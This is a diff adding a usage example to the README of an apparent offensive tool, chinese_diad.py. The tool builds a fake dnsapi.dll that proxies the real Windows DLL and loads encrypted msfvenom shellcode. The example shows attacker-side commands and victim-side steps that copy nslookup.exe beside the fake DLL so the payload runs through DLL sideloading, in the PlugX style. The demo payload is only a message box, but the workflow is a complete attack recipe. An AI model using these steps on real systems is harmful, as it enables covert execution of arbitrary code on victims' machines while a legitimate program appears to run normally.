@@ -45,6 +45,26 @@ options:
 python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System32\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin
 ```
 
+## Example
+
+```
+[[ ATTACK_BOX ]]
+mkdir -p /tmp/chiese_diad
+msfvenom -p windows/x64/messagebox -f raw -o /tmp/shellcode.bin
+python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System32\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin
+
+	#copy the fake dnsapi.dll and encrypted shellcode.bin to target
+```
+
+```
+[[ VICTIM ]]
+
+#From wherever dnsapi.dll and shellcode.bin are located
+copy \Windows\system32\nslookup.exe .
+.\nslookup.exe
+	#You should expect to be greeted by MSF, but your nslookup will also run.
+```
+
 ## References
 
 - github.com/Print3M/DllShimmer
